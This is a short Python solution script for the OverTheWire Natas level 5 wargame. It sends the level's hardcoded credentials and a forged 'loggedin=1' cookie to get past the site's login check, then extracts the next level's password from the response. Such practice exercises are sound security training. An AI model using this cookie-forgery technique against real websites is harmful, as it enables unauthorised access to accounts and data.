import requests
import re
from bs4 import BeautifulSoup
import colorama
from colorama import Fore, Style

colorama.init(autoreset=False)
print(Fore.LIGHTBLUE_EX, Style.BRIGHT)

username = 'natas5'
password = 'Z0NsrtIkJoKALBCLi5eqFfcRN82Au2oD'

cookie = {'loggedin': '1'}

url = f'http://{username}.natas.labs.overthewire.org/'

resp = requests.get(url=url, auth=(username, password), cookies=cookie)

soup = BeautifulSoup(resp.text, 'lxml')

print(re.findall('Access granted. (.*)', soup.text)[0])


